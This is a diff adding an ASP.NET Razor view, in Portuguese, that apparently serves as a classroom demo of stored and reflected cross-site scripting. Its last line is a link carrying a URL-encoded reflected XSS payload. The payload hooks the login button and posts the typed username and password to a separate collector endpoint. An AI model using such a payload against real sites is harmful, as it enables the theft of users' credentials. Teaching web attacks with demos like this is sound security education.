@@ -1,0 +1,32 @@
+﻿<h1>Exemplos XSS Attack</h1>
+
+@if (ViewBag.Message != null)
+{
+<div class="alert alert-@ViewBag.Type alert-dismissible" role="alert">
+    <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+    @ViewBag.Message
+</div>
+}
+
+<p><b>Demo Stored Attacks - </b>Protegida, Protegida 2, Desprotegida</p>
+<div class="row">
+    <div class="col-md-4">
+        <form asp-action="AdicionarComentario">
+            <div asp-validation-summary="ModelOnly" class="text-danger"></div>
+            <div class="form-group">
+                <label class="control-label">Adicionar Comentário</label>
+                <input class="form-control" name="comentario" />
+            </div>
+            <div class="form-group">
+                <input id="LoginButton" type="submit" value="Adicionar" class="btn btn-primary" />
+            </div>
+        </form>
+    </div>
+</div>
+
+<br />
+<br />
+<br />
+<p><b>Demo Reflected Attacks - </b>Pesquisa exemplo, Login exmplo</p>
+
+<p>Exemplo link login, clique <a href="http://localhost:37107/Home/Login?Username=%22/%3E%3Cscript%20defer%3E%20window.onload=function(){var%20botaoLogin%20=%20document.getElementById(%22LoginButton%22);%20botaoLogin.addEventListener(%22click%22,%20enviarDados);%20function%20enviarDados()%20{%20var%20username%20=%20document.getElementById(%22Username%22).value;%20var%20password%20=%20document.getElementById(%22Password%22).value;%20var%20url%20=%20%22http://localhost:63969/XSS/ReceberDadosLogin%22;%20var%20xhr%20=%20new%20XMLHttpRequest();%20xhr.open(%22POST%22,%20url,%20true);%20xhr.setRequestHeader(%27Content-Type%27,%20%27application/json%27);%20xhr.send(JSON.stringify({%20Username:%20username,%20Password:%20password,%20}));}%20}%3C/script%3E%20%3Cinput%20type=%22hidden%22%20value=%22">aqui</a></p>
